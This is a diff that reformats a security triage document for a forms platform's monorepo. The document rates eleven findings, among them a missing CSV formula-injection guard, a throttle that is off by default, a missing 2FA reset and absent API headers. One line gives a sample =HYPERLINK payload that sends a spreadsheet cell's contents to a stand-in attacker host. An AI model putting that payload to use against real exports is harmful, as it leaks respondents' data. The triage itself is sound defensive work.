@@ -1,6 +1,6 @@
 # Task 040: security-finding triage input
 
-**Prepared:** 2026-08-13 (PM/PO seat) · **Verified against:** `origin/main` at `4ade1a1`
+**Prepared:** 2026-08-13 · **Verified against:** `origin/main` at `4ade1a1`
 **Status:** working artifact in `plan/`. Not a decision, not a sign-off, not a deliverable of task 040.
 
 ## What this is, and what it is not
@@ -35,19 +35,19 @@ the author's hands inside a single sitting. Treat every row below as evidence, n
 Eleven findings: nine issue-backed (the ten open `security` issues minus #361, which is the tracker
 and not a finding), plus two that no issue covers.
 
-| Issue | Finding (one line) | Shape | Severity | Reachable by default | Entanglement |
-|---|---|---|---|---|---|
-| *(none)* | Response CSV export has no formula-injection guard; the admin's link export does | Missing control | **HIGH** | **Yes** | 040 task file already names it (line 19); collides with `apps/api` slice work |
-| #390 | better-auth sign-in throttle defaults off unless `NODE_ENV=production`; no boot signal | Insecure default shipped | **HIGH** | No in Docker, **yes** outside it | None open; needs a Code Owner decision (3 options) |
-| #432 | No 2FA reset path exists, so a leaked `QCMS_ADMIN_AUTH_SECRET` version can never be retired | Missing control | **HIGH** | Yes (on the recovery path) | Premise partly refuted; unblocks SEC-7 key-list pruning |
-| #305 | `redeliver`/`erase`/`unflag` take a client id with no form-scope check | Missing control (latent) | **MEDIUM** | Yes, but grants nothing extra today | Claimed on `fix/305-form-scope-check`; PR #454 also edits `registrars.ts` |
-| #453 | SEC-7 and SEC-6 promise a webhook dual-signing window the deliverer does not implement | Documented vs shipped | **MEDIUM** | Yes (on rotation) | **PR #469 only partly fixes it** (see below) |
-| #401 | `QCMS_SECURE_COOKIES` parses leniently in the portal, strictly in the admin | Insecure default / doc mismatch | **MEDIUM** | Yes | PR #451 vendors portal config into scaffold templates |
-| #372 | Base images unpinned, no Dependabot docker coverage, no image scanning; SEC-11 claims otherwise | Documented vs shipped + missing control | **MEDIUM** | Yes | 040's own deliverable (task file line 18) |
-| *(none)* | The API sets **no** security headers, while SEC-9 says it does and marks them delivered by 017 | Documented vs shipped | **MEDIUM** | Nil today by topology | Same family as #402 |
-| #402 | The API is a third reader of the secure-cookie rule with no loopback guard | Missing control | **LOW** | Nil today by topology | Depends on #401's parsing ruling |
-| #444 | `brace-expansion@5.0.8` and `nanoid@3.3.16` still resolve in the lockfile | Supply chain / signal defect | **LOW** (but see note) | N/A (unreachable) | **Blocks 040's exit criterion as literally worded** |
-| #460 | Recommended manual `create-admin` recipes land the passphrase in shell history | Documented vs shipped | **LOW** | Yes | Mitigated by task 061 (forced password change) |
+| Issue    | Finding (one line)                                                                              | Shape                                   | Severity               | Reachable by default                | Entanglement                                                                  |
+| -------- | ----------------------------------------------------------------------------------------------- | --------------------------------------- | ---------------------- | ----------------------------------- | ----------------------------------------------------------------------------- |
+| _(none)_ | Response CSV export has no formula-injection guard; the admin's link export does                | Missing control                         | **HIGH**               | **Yes**                             | 040 task file already names it (line 19); collides with `apps/api` slice work |
+| #390     | better-auth sign-in throttle defaults off unless `NODE_ENV=production`; no boot signal          | Insecure default shipped                | **HIGH**               | No in Docker, **yes** outside it    | None open; needs a Code Owner decision (3 options)                            |
+| #432     | No 2FA reset path exists, so a leaked `QCMS_ADMIN_AUTH_SECRET` version can never be retired     | Missing control                         | **HIGH**               | Yes (on the recovery path)          | Premise partly refuted; unblocks SEC-7 key-list pruning                       |
+| #305     | `redeliver`/`erase`/`unflag` take a client id with no form-scope check                          | Missing control (latent)                | **MEDIUM**             | Yes, but grants nothing extra today | Claimed on `fix/305-form-scope-check`; PR #454 also edits `registrars.ts`     |
+| #453     | SEC-7 and SEC-6 promise a webhook dual-signing window the deliverer does not implement          | Documented vs shipped                   | **MEDIUM**             | Yes (on rotation)                   | **PR #469 only partly fixes it** (see below)                                  |
+| #401     | `QCMS_SECURE_COOKIES` parses leniently in the portal, strictly in the admin                     | Insecure default / doc mismatch         | **MEDIUM**             | Yes                                 | PR #451 vendors portal config into scaffold templates                         |
+| #372     | Base images unpinned, no Dependabot docker coverage, no image scanning; SEC-11 claims otherwise | Documented vs shipped + missing control | **MEDIUM**             | Yes                                 | 040's own deliverable (task file line 18)                                     |
+| _(none)_ | The API sets **no** security headers, while SEC-9 says it does and marks them delivered by 017  | Documented vs shipped                   | **MEDIUM**             | Nil today by topology               | Same family as #402                                                           |
+| #402     | The API is a third reader of the secure-cookie rule with no loopback guard                      | Missing control                         | **LOW**                | Nil today by topology               | Depends on #401's parsing ruling                                              |
+| #444     | `brace-expansion@5.0.8` and `nanoid@3.3.16` still resolve in the lockfile                       | Supply chain / signal defect            | **LOW** (but see note) | N/A (unreachable)                   | **Blocks 040's exit criterion as literally worded**                           |
+| #460     | Recommended manual `create-admin` recipes land the passphrase in shell history                  | Documented vs shipped                   | **LOW**                | Yes                                 | Mitigated by task 061 (forced password change)                                |
 
 Counts: **3 high, 5 medium, 3 low.**
 
@@ -97,9 +97,9 @@ is server-generated and structurally safe** (link ids and URLs, which the same c
 "contains no comma, quote or newline today"). It is absent from the one export whose content is
 free text supplied by anonymous users of a public form.
 
-`docs/features/040-security-review-hardening.md:19` already names this: *"CSV export
+`docs/features/040-security-review-hardening.md:19` already names this: _"CSV export
 formula-injection guard (`=`, `+`, `-`, `@` prefixed cells escaped - add to 023's export if
-missing)."* It is missing.
+missing)."_ It is missing.
 
 **Concrete consequence.** The portal is public and anonymous sessions are a launch mode
 (`docs/SECURITY_DESIGN.md:63`). A respondent types `=HYPERLINK("https://attacker.example/?d="&A2,"Open")`
@@ -144,8 +144,8 @@ The repo knows this and depends on it: `apps/api/src/features/auth/sign-in-throt
 documents the module-load capture, and line 51 stubs `NODE_ENV=production` specifically to switch
 the throttle on for the test.
 
-`docs/SECURITY_DESIGN.md:39` states as delivered: *"Sign-in throttling: per-account and per-IP
-exponential backoff."* The traceability row (`:206`) marks SEC-1 delivered by `031 · #178 · 040`.
+`docs/SECURITY_DESIGN.md:39` states as delivered: _"Sign-in throttling: per-account and per-IP
+exponential backoff."_ The traceability row (`:206`) marks SEC-1 delivered by `031 · #178 · 040`.
 
 **Concrete consequence.** An operator running the API process with `NODE_ENV` unset gets **no
 brute-force limiter on admin sign-in**, silently. There is no warning, no log line, and no health
@@ -181,7 +181,7 @@ The gap is confirmed. `git grep` across `origin/main` for `reset-2fa`, `resetTwo
 `create-admin.ts`, which refuses once any admin exists. There is no coded or documented path to
 restore access to a locked-out administrator.
 
-But the issue's stated *reason* is wrong, and `docs/SECURITY_DESIGN.md:144` already says so:
+But the issue's stated _reason_ is wrong, and `docs/SECURITY_DESIGN.md:144` already says so:
 
 > There was never an accidental last door standing open behind a lost auth secret, which matters for
 > how the break-glass gap is prioritised (issue #432): it is a real gap and not a newly created one.
@@ -202,8 +202,8 @@ key retirement. `docs/SECURITY_DESIGN.md:150-152` spells it out:
 > live factor (`two-factor/disable` is unmounted), the list only grows. Pruning becomes possible
 > once a 2FA reset exists (issue #432).
 
-Combine that with the stored-secret threat model at `docs/SECURITY_DESIGN.md:55`: *"an attacker who
-holds **both** a database read **and** `QCMS_ADMIN_AUTH_SECRET` recovers usable second factors."*
+Combine that with the stored-secret threat model at `docs/SECURITY_DESIGN.md:55`: _"an attacker who
+holds **both** a database read **and** `QCMS_ADMIN_AUTH_SECRET` recovers usable second factors."_
 
 **Concrete consequence.** An operator whose `QCMS_ADMIN_AUTH_SECRET` leaks cannot fully rotate it.
 They can prepend a new version to `QCMS_ADMIN_AUTH_SECRETS`, and recovery codes re-encode on
@@ -291,9 +291,9 @@ be corrected regardless of whether the pinning work happens**, and `packages/db/
 carries a smaller version of the same conflation, calling a tag reference "pinned".
 
 **The API sets no security headers (no issue exists).** `docs/SECURITY_DESIGN.md:162` reads
-*"**Headers** (both Next apps + API): CSP ..., `X-Content-Type-Options: nosniff`,
-`Referrer-Policy: strict-origin-when-cross-origin`, `frame-ancestors 'none'`"* and marks them
-*"Delivered: 017 (API headers/limits)"*. `apps/api/src/middleware/` contains exactly five files
+_"**Headers** (both Next apps + API): CSP ..., `X-Content-Type-Options: nosniff`,
+`Referrer-Policy: strict-origin-when-cross-origin`, `frame-ancestors 'none'`"_ and marks them
+_"Delivered: 017 (API headers/limits)"_. `apps/api/src/middleware/` contains exactly five files
 (`admin-auth`, `error-envelope`, `internal-token`, `request-logger`, and one test); a grep of
 `apps/api/src/` for `X-Content-Type-Options`, `Referrer-Policy`, `secureHeaders` and
 `frame-ancestors` returns **zero hits**; and `apps/api/src/app.ts:101-107` installs only
@@ -325,8 +325,8 @@ in `packages/`, `apps/`, `scripts/` or `tooling/`, and neither appears in any `p
 exploitability here is nil.
 
 **Two premise problems worth 040's attention, both in `CONTRIBUTING.md`'s overrides table.**
-`CONTRIBUTING.md:92` justifies the `postcss: ^8.5.23` override on the grounds that *"the whole tree
-dedupes onto one postcss 8 instance"*. It does not: `^8.5.23` is satisfied by both `8.5.23` and
+`CONTRIBUTING.md:92` justifies the `postcss: ^8.5.23` override on the grounds that _"the whole tree
+dedupes onto one postcss 8 instance"_. It does not: `^8.5.23` is satisfied by both `8.5.23` and
 `8.5.26`, so pnpm keeps both, which is exactly the condition #444 reports. And `CONTRIBUTING.md:94`
 states the brace-expansion advisory range as `<= 5.0.7` while #444 reports `>=4.0.0 <5.0.9`; one of
 the two is wrong and 040 should establish which. The overrides table is described in `CLAUDE.md` as
@@ -335,8 +335,8 @@ the removal-condition ledger, so an inaccurate justification in it is a durable 
 **The severity label is doing two jobs and 040 must separate them.** As a risk this is low. As a
 **process** matter it is blocking, because 040's exit criterion 3 is "zero open high-severity
 findings" and both advisories are rated high upstream. The 2026-08-13 triage comment on #444 makes
-the right call and is worth carrying into the review doc verbatim: *"unreachable is not the same as
-fixed, and the criterion is about open high-severity findings, not exploitable ones."* The dedupe is
+the right call and is worth carrying into the review doc verbatim: _"unreachable is not the same as
+fixed, and the criterion is about open high-severity findings, not exploitable ones."_ The dedupe is
 a lockfile change with no API surface and is cheaper than a waiver, which would be a permanent
 maintenance obligation.
 
@@ -360,9 +360,9 @@ here; I read the commit subject, not the implementation.
 
 Four, and they run in both directions.
 
-**1. #432's causal claim is refuted.** The title asserts *"#319 closes the accidental one"* and the
-body asserts *"recovery codes are stored in plaintext, so an operator who has lost access can read
-them out of the database."* Both are false and were false when filed.
+**1. #432's causal claim is refuted.** The title asserts _"#319 closes the accidental one"_ and the
+body asserts _"recovery codes are stored in plaintext, so an operator who has lost access can read
+them out of the database."_ Both are false and were false when filed.
 `apps/api/src/features/auth/instance.ts:367-382` sets `storeBackupCodes: "encrypted"`, and
 `docs/SECURITY_DESIGN.md:142-144` records the original error in detail: it came from reading
 better-auth's decoder without reading the caller that supplies the option, which defaults to
@@ -374,7 +374,7 @@ the issue text, it would have either dismissed the issue with the premise or acc
 relationship to #319 that does not exist.
 
 **2. #370's described work is done, by a different mechanism, and the issue is now closed.** The
-issue asks to *"flip `disableLogSending`"*. At `origin/main` there is no `PinoInstrumentation` and no
+issue asks to _"flip `disableLogSending`"_. At `origin/main` there is no `PinoInstrumentation` and no
 `disableLogSending` anywhere in the repo: task 062 removed pino from the OTel path entirely and
 wired a `LoggerProvider` directly (`apps/api/src/telemetry.ts:154-157`). The SEC-13 amendment the
 issue required rode with it (`docs/SECURITY_DESIGN.md:184-194`,
@@ -399,10 +399,10 @@ real as a supply-chain fact while being unexploitable here. That analysis stands
 
 This is the section a per-issue list structurally cannot contain, and #361 names why: #341 hid at
 this level, where every component behaved as written and the composition did not. Nine seams, in
-rough priority order. Items marked *recommendation* are proposals, not findings.
+rough priority order. Items marked _recommendation_ are proposals, not findings.
 
 **C1. The authorization matrix suite does not exist, and it is 040's largest deliverable.**
-`docs/SECURITY_DESIGN.md:120` states *"Enforcement tests for this matrix are part of 040"*, and the
+`docs/SECURITY_DESIGN.md:120` states _"Enforcement tests for this matrix are part of 040"_, and the
 task file's first deliverable is `apps/api/e2e/security/`. That directory does not exist:
 `apps/api/e2e/` holds five scenario files (`01-full-loop`, `02-anonymous`, `03-version-pinning`,
 `04-mount-split`, `05-failure-tour`) plus support. Every cell of the §3.2 matrix at
@@ -413,13 +413,13 @@ a "list of open issues" cannot surface it.
 **C2. A control present in one app and absent in its twin.** H1 is the concrete instance found:
 `apps/admin/lib/forms/links.ts:40-43` guards CSV formula injection on safe data;
 `apps/api/src/features/responses/admin/csv.ts:52-57` does not, on attacker-controlled data.
-*Recommendation:* 040 should treat "twin asymmetry" as a search pattern rather than a one-off, since
+_Recommendation:_ 040 should treat "twin asymmetry" as a search pattern rather than a one-off, since
 this triage found four instances of it in different territories (the CSV guard; #401's parsers;
 #402's two-of-three readers; PR #411's trim/no-trim message asymmetry between
 `apps/portal/lib/server/config.ts:167-171` and `apps/admin/lib/server/config.ts:230-234`).
 
 **C3. The admin-gate ordering invariant is asserted in seven places and pinned in one.**
-`apps/api/src/registrars.ts:34-36` states *"`registerAdminAuth` MUST be first in `admin`"*, and six
+`apps/api/src/registrars.ts:34-36` states _"`registerAdminAuth` MUST be first in `admin`"_, and six
 route files repeat it (`features/forms/route.ts:289`, `links/route.ts:85`, `outbox/route.ts:88`,
 `questions/route.ts:203`, `responses/admin/route.ts:163`, `webhooks/route.ts:110`). The per-slice
 `admin-mount.test.ts` files cannot detect a regression in that list, because they build their own
@@ -441,7 +441,7 @@ mitigation proposed in a #361 comment, a boot log naming the trusted hop count, 
 `apps/api/src/main.ts:98-103` logs `port`, `mount` and `tracing`, and neither
 `apps/portal/instrumentation.ts` nor `apps/admin/instrumentation.ts` logs
 `QCMS_PORTAL_TRUSTED_PROXY_HOPS` or `QCMS_ADMIN_TRUSTED_PROXY_HOPS`. It logs configuration, not an
-address, so SEC-13 is untouched. *Recommendation:* 040 should decide this rather than leave it in a
+address, so SEC-13 is untouched. _Recommendation:_ 040 should decide this rather than leave it in a
 comment thread, since it is the only in-process detection surface the design admits.
 
 **C5. Every rate limit is per-process, and the security document does not say so.**
@@ -475,8 +475,8 @@ what "logs across service boundaries" means, since the portal and admin have no 
 one service's logs correlated to a cross-boundary trace.
 
 **C8. SEC-8's placeholder-refusal claim is unverified and may be a fourth documented-vs-shipped
-instance.** `docs/SECURITY_DESIGN.md:166` says *"a deployment with placeholder secrets must refuse to
-boot."* Grepping `apps/api/src/config.ts` for `placeholder`, `change-me` and `CHANGEME` returns
+instance.** `docs/SECURITY_DESIGN.md:166` says _"a deployment with placeholder secrets must refuse to
+boot."_ Grepping `apps/api/src/config.ts` for `placeholder`, `change-me` and `CHANGEME` returns
 nothing, and validation appears to be length-based only, so a 32-character placeholder would boot.
 The claim's stated subject is the 037 scaffold's `.env.example`, which does not exist on `main`
 (the repo root `.env.example` carries only `DATABASE_URL`) and arrives with PR #451 as
@@ -485,8 +485,8 @@ the sentence or the software changes.
 
 **C9. The byte-versus-character conflation is live in code on two constants, not one.** #361's
 2026-08-13 comment reports `APP_KEY_MIN_LENGTH`'s docstring. Both are affected:
-`apps/api/src/config.ts:31` reads *"Minimum **bytes** for signing/secret material"* and `:33` reads
-*"32 **bytes** = 256 bits"*, on constants whose consumer compares `raw.length`, i.e. characters. A
+`apps/api/src/config.ts:31` reads _"Minimum **bytes** for signing/secret material"_ and `:33` reads
+_"32 **bytes** = 256 bits"_, on constants whose consumer compares `raw.length`, i.e. characters. A
 31-character key is refused whatever its byte count and a 32-character non-ASCII key is accepted
 though it exceeds 32 bytes. Small, but it is a security floor described in the wrong unit in the
 config module that enforces it, and no issue covers it.
